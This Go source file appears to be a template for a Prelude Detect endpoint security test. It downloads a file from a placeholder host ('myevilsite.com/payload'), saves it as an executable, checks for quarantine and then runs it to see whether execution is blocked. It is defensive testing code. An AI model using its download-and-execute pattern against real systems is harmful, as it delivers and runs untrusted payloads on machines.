package main

import (
	"flag"
	"os"
	"path/filepath"
	"time"

	"github.com/dumpst3rfir3/meh"
	endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

var cleanFlag bool
var filesWritten []string
var name string = "My Prelude Detect Test"
var version string = "1.0.0"

func clean() {
	endpoint.Say("Cleaning up")
	meh.CleanFiles(filesWritten...)
}

func init() {
	flag.BoolVar(&cleanFlag, "clean", false, "Just do clean up.")
	flag.Parse()
}

func main() {
	if cleanFlag {
		setup()
		clean()
		os.Exit(0)
	}

	meh.StartWithCustomTimeout(test, 90*time.Second, clean)
}

func run() {
	var cmd []string = []string{
		filesWritten[0],
		"--payloadArg",
	}
	var e error
	var p *os.Process

	if p, e = meh.Run(cmd); e != nil {
		endpoint.Say("Execution failed: %s", e)
		meh.Stop(endpoint.ExecutionPrevented)
	}

	endpoint.Wait(-1)

	// Doesn't kill children, do that manually in clean
	endpoint.Say("Killing %s process...", name)
	if e = p.Kill(); e != nil {
		endpoint.Say("Failed to kill process: %s", e)
		endpoint.Say("Note: it may have exited on its own")
	}

	endpoint.Say("Successfully killed process")
}

func setup() {
	// TODO:put any setup stuff here
}

func test() {
	var b []byte
	var expectedMD5 string = "deadbeefdeadbeefdeadbeefdeadbeef"
	var outfile string = `testpayload.exe`
	var url string = "https://myevilsite.com/payload"

	endpoint.Say("Executing %s test v%s", name, version)

	// Prep
	setup()

	// Download from URL
	b = meh.Download(url, expectedMD5, "")

	// Write to testpayload.exe expecting no quarantine
	meh.CheckQuarantine(outfile, b, false)

	// It will only get here if outfile is not quarantined
	// So we need to add the written file to list of files,
	// so it can be cleaned up later
	dir, _ := os.Getwd()
	filesWritten = append(filesWritten, filepath.Join(dir, outfile))

	// Written to disk, so try to run it and see if it gets blocked
	run()

	meh.Stop(endpoint.Unprotected)

}
